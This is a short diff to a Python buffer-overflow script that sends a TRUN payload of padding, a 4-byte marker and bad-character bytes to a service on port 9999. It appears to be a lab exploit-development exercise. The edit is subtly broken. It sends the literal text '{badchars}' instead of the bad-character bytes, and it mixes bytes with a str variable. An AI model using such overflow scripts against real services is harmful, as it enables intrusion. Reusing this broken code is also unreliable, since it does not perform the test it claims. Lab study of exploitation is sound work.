@@ -22,8 +22,8 @@ badchars = (
     "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 )
 
-shellcode = "A" * 2003 + "B" * 4 + badchars
-data = "TRUN /.:/" + shellcode
+shellcode = b"A" * 2003 + b"B" * 4 + b"{badchars}"
+data = b"TRUN /.:/" + shellcode
 
 ip = "192.168.1.11"
 port = 9999
@@ -31,9 +31,9 @@ port = 9999
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ip, port))
-    s.send((data.encode()))
+    s.send((data))
     s.close()
 
-except:
+except socket.error:
     print("Error connecting to server")
     sys.exit()
